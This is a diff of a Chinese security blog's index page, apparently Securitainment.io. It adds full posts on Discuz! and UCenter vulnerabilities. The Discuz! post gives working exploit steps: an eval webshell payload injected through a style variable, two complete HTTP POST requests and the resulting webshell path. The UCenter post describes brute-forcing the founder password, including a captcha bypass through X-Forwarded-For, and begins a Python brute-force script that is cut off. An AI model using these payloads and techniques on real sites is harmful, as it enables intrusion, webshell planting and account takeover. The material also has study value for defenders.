@@ -1,193 +1,985 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="">
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="renderer" content="webkit">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-     <link rel="shortcut icon" href= //images/favicon.ico >
-    <title>
-        Securitainment.io
-    </title>
-    
-<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/site.webmanifest.json">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
 
-    
-<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/main.css">
 
-    
-<link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 4.2.1"></head>
-<body id="bodyx">
-    <div class="hd logodiv">
-    <img src="/img/male.png" class="logopng">
-    <p class="logot">
-         Securitainment.io 
-         <span class="logo_2"><i class="fa fa-battery-full" ></i></span>
-        <h3 class="words" style="font-weight: bold;font-family: Georgia;"> 
-            运维 | 安全 
-        </h3>
-    </p>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.securitainment.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="运维 | 安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Securitainment.io">
+<meta property="og:url" content="https://blog.securitainment.io/page/3/index.html">
+<meta property="og:site_name" content="Securitainment.io">
+<meta property="og:description" content="运维 | 安全">
+<meta property="article:author" content="Groot">
+<meta property="article:tag" content="运维">
+<meta property="article:tag" content=" 安全">
+<meta property="article:tag" content=" 测试">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.securitainment.io/page/3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'default'
+  };
+</script>
+
+  <title>Securitainment.io</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Securitainment.io</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Watch, and have fun.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
 
 </div>
-<div class="hd">
-    <ol class="breadcrumb">
-        
-            <li><a class="ba" href="/about">关于我👀</a></li>
-        
-            <li><a class="ba" href="/null">访问主站🎉</a></li>
-        
-            <li><a class="ba" href="/null">Github🐒</a></li>
-        
-    </ol>
-    <hr class="breadcrumbhr">
-</div>
-<div class="hd">
+    </header>
+
     
-    
-        
-        
-            <div class="titlex">
-                <p><span class="jing">& </span><span style="color: #6d9ee7;">公元</span> 
-                 2016年🕛
-                </p>
-            </div>
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
             
-        
-        <a class="flink" href="/2016/05/14/discuz-admin_styles.inc.php-get-webshell/">
-            <div class="list">
-                <div class="postname">
-                    Discuz! admin_styles.inc.php get-webshell bug
-                </div>
-                <div class="posttime">
-                    May 14th
-                </div>
-            </div>
-        </a>
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/14/discuz-admin_styles.inc.php-get-webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/discuz-admin_styles.inc.php-get-webshell/" class="post-title-link" itemprop="url">Discuz! admin_styles.inc.php get-webshell bug</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:53:06" itemprop="dateCreated datePublished" datetime="2016-05-14T00:53:06+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:30:04" itemprop="dateModified" datetime="2019-07-25T14:30:04+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
     
-        
-        
-        <a class="flink" href="/2016/05/14/ucenter-bug-list/">
-            <div class="list">
-                <div class="postname">
-                    Ucenter vuls list
-                </div>
-                <div class="posttime">
-                    May 14th
-                </div>
-            </div>
-        </a>
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
     
-        
-        
-        <a class="flink" href="/2016/05/14/discuz-bug-list/">
-            <div class="list">
-                <div class="postname">
-                    Discuz vuls list
-                </div>
-                <div class="posttime">
-                    May 14th
-                </div>
-            </div>
-        </a>
+    <a title="disqus" href="/2016/05/14/discuz-admin_styles.inc.php-get-webshell/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/discuz-admin_styles.inc.php-get-webshell/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
     
-        
-        
-        <a class="flink" href="/2016/05/14/python-tips/">
-            <div class="list">
-                <div class="postname">
-                    Python skill collection
-                </div>
-                <div class="posttime">
-                    May 14th
-                </div>
-            </div>
-        </a>
     
-        
-        
-        <a class="flink" href="/2016/05/04/wget-usage/">
-            <div class="list">
-                <div class="postname">
-                    wget 使用筆記
-                </div>
-                <div class="posttime">
-                    May 4th
-                </div>
-            </div>
-        </a>
     
-        
-        
-            <div class="titlex">
-                <p><span class="jing">& </span><span style="color: #6d9ee7;">公元</span> 
-                 2000年🕛
-                </p>
-            </div>
-            
-        
-        <a class="flink" href="/2000/01/01/hello-world/">
-            <div class="list">
-                <div class="postname">
-                    Hello World
-                </div>
-                <div class="posttime">
-                    January 1st
-                </div>
-            </div>
-        </a>
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="Discuz-admin-styles-inc-php-get-webshell-bug"><a href="#Discuz-admin-styles-inc-php-get-webshell-bug" class="headerlink" title="Discuz! admin_styles.inc.php get-webshell bug"></a>Discuz! admin_styles.inc.php get-webshell bug</h1><pre><code>author: ring04h
+team:http://www.80vul.com</code></pre><p>由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞.</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>在文件admin\styles.inc.php里代码:</p>
+<pre><code>if($newcvar &amp;&amp; $newcsubst) {
+    if($db-&gt;result_first(&quot;SELECT COUNT(*) FROM {$tablepre}stylevars WHERE variable=&apos;$newcvar&apos; AND styleid=&apos;$id&apos;&quot;)) {
+        cpmsg(&apos;styles_edit_variable_duplicate&apos;, &apos;&apos;, &apos;error&apos;);
+    } elseif(!preg_match(&quot;/[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*/&quot;, $newcvar)) {
+        cpmsg(&apos;styles_edit_variable_illegal&apos;, &apos;&apos;, &apos;error&apos;);
+    }
+    $newcvar = strtolower($newcvar);
+    $db-&gt;query(&quot;INSERT INTO {$tablepre}stylevars (styleid, variable, substitute)
+        VALUES (&apos;$id&apos;, &apos;$newcvar&apos;, &apos;$newcsubst&apos;)&quot;);
+}</code></pre><p>上面代码可以看出来当有后台权限时,可通过编辑风格,自定义模板变量处插入</p>
+<pre><code>&lt;strong&gt; !&apos;,&apos;80VUL&apos;);EVAL(
+___FCKpd___0
+
+POST[RING]);// &lt;/strong&gt;</code></pre><p>替换出插入 exp by ring04h!，远程写入webshell执行代码.</p>
+<h1 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h1><p>step1：</p>
+<pre><code>POST /bbs/admincp.php?action=styles HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.80vul.com/bbs/admincp.php?action=styles
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: www.80vul.com
+Content-Length: 154
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: 
+
+formhash=99238f2d&amp;anchor=&amp;updatecsscache=0&amp;namenew%5B1%5D=%C4%AC%C8%CF%B7%E7%B8%F1&amp;availablenew%5B1%5D=1&amp;defaultnew=1&amp;newname=exp&amp;stylesubmit=%CC%E1%BD%BB</code></pre><p>step2:</p>
+<pre><code>POST /bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6 HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.80vul.com/bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: www.80vul.com
+Content-Length: 1402
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: 
+
+formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5B249%5D=1&amp;stylevar%5B247%5D=&amp;stylevar%5B248%5D=&amp;stylevar%5B246%5D=&amp;stylevar%5B250%5D=&amp;stylevarbgimg%5B250%5D=&amp;stylevarbgextra%5B250%5D=&amp;stylevar%5B251%5D=&amp;stylevarbgimg%5B251%5D=&amp;stylevarbgextra%5B251%5D=&amp;stylevar%5B252%5D=&amp;stylevarbgimg%5B252%5D=&amp;stylevarbgextra%5B252%5D=&amp;stylevar%5B253%5D=&amp;stylevar%5B254%5D=&amp;stylevar%5B255%5D=&amp;stylevar%5B256%5D=&amp;stylevar%5B257%5D=&amp;stylevar%5B258%5D=&amp;stylevar%5B259%5D=&amp;stylevar%5B260%5D=&amp;stylevar%5B261%5D=&amp;stylevar%5B262%5D=&amp;stylevar%5B263%5D=&amp;stylevar%5B264%5D=&amp;stylevar%5B265%5D=&amp;stylevar%5B266%5D=&amp;stylevar%5B267%5D=&amp;stylevar%5B268%5D=&amp;stylevar%5B269%5D=&amp;stylevar%5B270%5D=&amp;stylevar%5B271%5D=&amp;stylevar%5B272%5D=&amp;stylevar%5B273%5D=&amp;stylevar%5B274%5D=&amp;stylevar%5B275%5D=&amp;stylevarbgimg%5B275%5D=&amp;stylevarbgextra%5B275%5D=&amp;stylevar%5B276%5D=&amp;stylevar%5B277%5D=&amp;stylevar%5B278%5D=&amp;stylevar%5B279%5D=&amp;stylevar%5B280%5D=&amp;stylevar%5B281%5D=&amp;stylevar%5B282%5D=&amp;stylevar%5B283%5D=&amp;stylevarbgimg%5B283%5D=&amp;stylevarbgextra%5B283%5D=&amp;stylevar%5B284%5D=&amp;stylevarbgimg%5B284%5D=&amp;stylevarbgextra%5B284%5D=&amp;stylevar%5B285%5D=&amp;stylevarbgimg%5B285%5D=&amp;stylevarbgextra%5B285%5D=&amp;stylevar%5B286%5D=&amp;stylevar%5B287%5D=&amp;stylevar%5B288%5D=&amp;stylevar%5B289%5D=&amp;stylevar%5B290%5D=&amp;stylevar%5B291%5D=&amp;newcvar=%21%27%2C%2780vul%27%29%3Beval%28%24_post%5Bring%5D%29%3B%2F%2F&amp;newcsubst=exp+by+ring04h%21&amp;editsubmit=%CC%E1%BD%BB</code></pre><p>webshell:</p>
+<pre><code>http://www.80vul.com/bbs/forumdata/cache/style_6.php </code></pre>
+      
+    </div>
+
     
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/14/ucenter-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/ucenter-bug-list/" class="post-title-link" itemprop="url">Ucenter vuls list</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:51:04" itemprop="dateCreated datePublished" datetime="2016-05-14T00:51:04+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:26:35" itemprop="dateModified" datetime="2019-07-25T14:26:35+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/ucenter-bug-list/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/ucenter-bug-list/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<ol>
+<li><p>暴力破解创始人密码</p>
+<p> 漏洞文件:<code>/control/app.php:34:onadd</code></p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$ucfounderpw = getgpc(<span class="string">'ucfounderpw'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptype = getgpc(<span class="string">'apptype'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appname = getgpc(<span class="string">'appname'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appurl = getgpc(<span class="string">'appurl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appip = getgpc(<span class="string">'appip'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$viewprourl = getgpc(<span class="string">'viewprourl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appcharset = getgpc(<span class="string">'appcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appdbcharset = getgpc(<span class="string">'appdbcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptagtemplates = getgpc(<span class="string">'apptagtemplates'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appallowips = getgpc(<span class="string">'allowips'</span>, <span class="string">'P'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(md5(md5($ucfounderpw).UC_FOUNDERSALT) == UC_FOUNDERPW || (strlen($ucfounderpw) == <span class="number">32</span> &amp;amp;&amp;amp; $ucfounderpw == md5(UC_FOUNDERPW))) &#123;</span><br><span class="line">		@ob_start();</span><br><span class="line">		$return  = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">		$app = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_first(&amp;quot;SELECT * FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications WHERE url=<span class="string">'$appurl'</span> <span class="keyword">AND</span> type=<span class="string">'$apptype'</span>&amp;quot;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($app)) &#123;</span><br><span class="line">			$authkey = <span class="keyword">$this</span>-&amp;gt;_generate_key();</span><br><span class="line">			$apptagtemplates = <span class="keyword">$this</span>-&amp;gt;serialize($apptagtemplates, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;db-&amp;gt;query(&amp;quot;INSERT INTO &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications SET</span><br><span class="line">				name=<span class="string">'$appname'</span>,</span><br><span class="line">				url=<span class="string">'$appurl'</span>,</span><br><span class="line">				ip=<span class="string">'$appip'</span>,</span><br><span class="line">				authkey=<span class="string">'$authkey'</span>,</span><br><span class="line">				viewprourl=<span class="string">'$viewprourl'</span>,</span><br><span class="line">				synlogin=<span class="string">'1'</span>,</span><br><span class="line">				charset=<span class="string">'$appcharset'</span>,</span><br><span class="line">				dbcharset=<span class="string">'$appdbcharset'</span>,</span><br><span class="line">				type=<span class="string">'$apptype'</span>,</span><br><span class="line">				recvnote=<span class="string">'1'</span>,</span><br><span class="line">				tagtemplates=<span class="string">'$apptagtemplates'</span>,</span><br><span class="line">				allowips=<span class="string">'$appallowips'</span></span><br><span class="line">				&amp;quot;);</span><br><span class="line">			$appid = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;insert_id();</span><br><span class="line"></span><br><span class="line">			$_ENV[<span class="string">'app'</span>]-&amp;gt;alter_app_table($appid, <span class="string">'ADD'</span>);</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$authkey|$appid|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$authkey|$appid|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'cache'</span>);</span><br><span class="line">			$_ENV[<span class="string">'cache'</span>]-&amp;gt;updatedata(<span class="string">'apps'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'note'</span>);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_all(&amp;quot;SELECT appid, type, name, url, ip, charset, synlogin, extra FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications&amp;quot;);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;_format_notedata($notedata);</span><br><span class="line">			$notedata[<span class="string">'UC_API'</span>] = UC_API;</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;add(<span class="string">'updateapps'</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&amp;gt;serialize($notedata, <span class="number">1</span>));</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;send();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">		&#125;</span><br><span class="line">		@ob_end_clean();</span><br><span class="line">		<span class="keyword">exit</span>($return);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'-1'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这个函数的意思是 添加一个应用,前提是需要创始人的密码。如果密码正确,就会添加一个应用（如果重复了就直接输出）。</p>
+<p> 如何利用：</p>
+<p> <img src="http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg" alt=""></p>
+<p> 截获个数据包然后放入burp中添加密码字典进行批量破解。<br> 成功会返回添加应用的信息，反之返回 -1。<br> 在一些网站中往往把 uc_server/admin.php做了访问限制.<br> 而index.php这里就可以直接调用破解。返回的应用信息还可以直接getshell或注入。<br> 测试版本：Discuz! X3.2 搭载的 UCenter 1.6.0</p>
+</li>
+<li><p>暴力破解创始人密码02</p>
+<p> 后台地址一般为：<code>**.**.**.**/discuz/uc_server/admin.php</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/2106555215e9de33121ac345e389897e7a033bb1.png" alt=""></p>
+<p> 含有一个验证码，验证码的地址为：</p>
+<blockquote>
+<p><a href="http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500" target="_blank" rel="noopener">http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500</a></p>
+</blockquote>
+<p> 但是，经过测试发现，登录uc_server的时候 如果ip第一次出现那么 seccode的默认值为cccc，而 ip地址 是通过X-Forwarded-For 获取的。也就是我们修改xff的ip之后，再次打开上面那个验证码url，图片的值为cccc</p>
+<p> <img src="http://www.wooyun.org/upload/201410/21071436735b1f7ae3a6d308d74b2a37b80b090e.png" alt=""></p>
+<p> 所以可以写一个程序通过修改X-Forwarded-For的值爆破密码。</p>
+ <poc>
+
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httplib,re,random,urllib,time,requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># Boom</span></span><br><span 